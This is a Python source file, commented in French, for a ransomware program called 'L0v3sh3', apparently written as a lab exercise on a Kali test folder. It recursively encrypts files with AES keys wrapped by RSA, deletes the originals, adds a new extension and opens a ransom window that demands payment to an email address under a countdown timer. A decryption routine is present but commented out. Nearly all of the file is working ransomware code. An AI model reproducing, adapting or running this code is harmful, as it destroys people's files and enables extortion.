# --------------------------le code du malware-------------------------------------

import base64
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from pathlib import Path
import tkinter as tk

"""le code pour genrer une clé et la chiffrer"
key = RSA.generate(2048)
privateKey = key.export_key()
publicKey = key.publickey().export_key()

# save private key to file
with open('private.pem', 'wb') as f:
    f.write(privateKey)

# save public key to file
with open('public.pem', 'wb') as f:
    f.write(publicKey)

print('la clé privée est sauvegarder dans private.pem')
print('la clé publique est sauvegarder dans public.pem')
print('avec succés')
"""

with open("public.pem", "rb") as f:
    public = f.read()
    print(base64.b64encode(public))


# fonction recursive qui verifie un repertoire et liste les fichiers dedans
def lister_fichier(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from lister_fichier(entry.path)

# fonction de chiffrement
def encrypt(dataFile, publicKey):
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName = dataFile.split(extension)[0]
    fileExtension = '.L0v3sh3'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)


# print('Le fichier chiffrer se nomme ' + encryptedFile)

# chiffre le nom des fichiers dans le répertoire courant sauf(exe, py, pem)
directory = '/home/kali/testmalware/'
excludeExtension = ['.exe', '.py', '.pem']
for item in lister_fichier(directory):
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePath, public)


# fonction qui affiche le compteur
def countdown(count):
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)
    # le format dans le quel va etre afficher le compteur a la cible
    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))

    # La création d'une instance de Tk initialise cet interpréteur et crée la fenêtre root


root = tk.Tk()
root.title('L0v3sh3 Ransomware')
root.geometry('600x300')
root.resizable(False, False)

# affichage du pop-up sur l'ecran de la cible avec la facon de recuperer ses données
label1 = tk.Label(root, text="On a vos Données PAYEZ la rancon\n a l'adresse hacker@mail.com pour les recuprer\n\n",
                  font=('calibri', 16, 'bold'))
label1.pack()
label = tk.Label(root, font=('calibri', 50, 'bold'), fg='white', bg='red')
label.pack()

countdown('01:30:00')
root.mainloop()

# rancon = False
# si la rancon est payé elle devient True et on donne la cle pour dechiffrer

# la fonction de dechiffrement
"""
privateKeyFile = 'private.pem'
def decrypt(dataFile, privateKeyFile):
   # read private key from file
    with open("/home/kali/privateKey.pem", 'rb') as f:
        privateKey = f.read()

    # create private key object
    key = RSA.import_key(privateKey)

    with open(dataFile, 'rb') as f:
    # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # save the decrypted data to file
    [ fileName, fileExtension ] = dataFile.split('.')
    decryptedFile = fileName + '_dechiffrer.' + fileExtension

    with open(decryptedFile, 'wb') as f:
        f.write(data)
    print('Le fichier déchiffrer se nomme ' + decryptedFile)
    """
